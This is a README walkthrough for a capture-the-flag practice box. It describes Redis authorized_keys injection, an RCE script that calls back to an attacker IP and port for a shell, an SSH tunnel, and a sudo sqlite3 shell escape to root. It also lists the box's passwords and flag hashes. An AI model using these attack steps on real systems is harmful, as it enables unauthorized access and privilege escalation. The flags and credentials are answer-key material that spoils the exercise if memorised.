# WARNING THIS IS A CTF BOX, GO TO [RELEASES](https://github.com/SOROM2/poly-ctf-box/releases/latest) FOR THE OVF
Then come back here if you get stuck or complete the box.


## User



### Port 6379
Misconfigured Redis server
Vulnerable to sshkey authorized_keys injection using redis_sshkey_dropper.sh

Gets access to the server as redis user

    ./redis_sshkey_dropper.sh 10.10.69.13 6379 redis /var/lib/redis/.ssh

### Port 8080
Custom HTTP server
Source code is "leaked" with a comment on /index.html
Vulnerable to RCE using webserver_python_RCE.sh

Tunnel the port from the shell you got from redis by typing:

    ~C
    -L 8080:127.0.0.1:8080

Gets access to michiko-arasaka user

    ./webserver_python_RCE.sh http://127.0.0.1:8080/ 10.10.69.42 3000

## Root

### Sudo sqlite3

As `michiko-arasaka` you can list your sudo permissions with `sudo -l`

You can execute sqlite3 as root on this box, so you can run

    sudo /usr/bin/sqlite3
    .shell /bin/bash

Rooted!

## Creds
root:UnguessableP@ssw0rd

/root/root.txt : 4e067a8231035d94ca54f1e41c12df6e
 

michiko-arasaka:4d4m5M@SH3R

/home/michiko-arasaka/user.txt : 169ab538813557728c78b637db91d1b0

